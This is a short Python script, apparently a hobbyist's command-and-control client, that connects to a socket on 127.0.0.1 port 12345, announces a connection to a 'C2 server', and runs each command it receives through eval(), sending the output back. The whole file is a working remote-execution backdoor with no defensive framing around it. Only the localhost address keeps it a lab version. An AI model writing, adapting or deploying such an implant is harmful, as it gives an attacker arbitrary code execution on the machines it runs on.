# Copyright (c) 2026 transcrime

import socket
import logging
from logging.handlers import SocketHandler 

socket_handler = SocketHandler("127.0.0.1", 12345)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[socket_handler])

logging.info("Sending this data to the server file.")
def main():
    client = socket.socket()
    try:
       client.connect(("127.0.0.1", 12345))
       print("[+] Connected to C2 server")
    except Exception as e:
       logging.error(f"Couldn't connect to server:")

    while True:
     try:
        cmd = client.recv(2048).decode()
        if cmd.lower() == "exit":
            result = "Exiting SERVER:"
            break
        elif cmd.lower() == "test":
           logging.info("Testing.. 1.2.3")
           result = "testing.. 1.2.3"
           
        else:
          result = command_console(cmd)
        client.send(result.encode())
     except Exception as e:
      logging.error(f"Error processing command: {e}")
      break

    client.close()
    logging.info("[+] Connection closed")

def command_console(cmd):
    try:
        output = eval(cmd)
        return str(output)
    except Exception as e:
        return str(e)
    
if __name__ == "__main__":

     main()
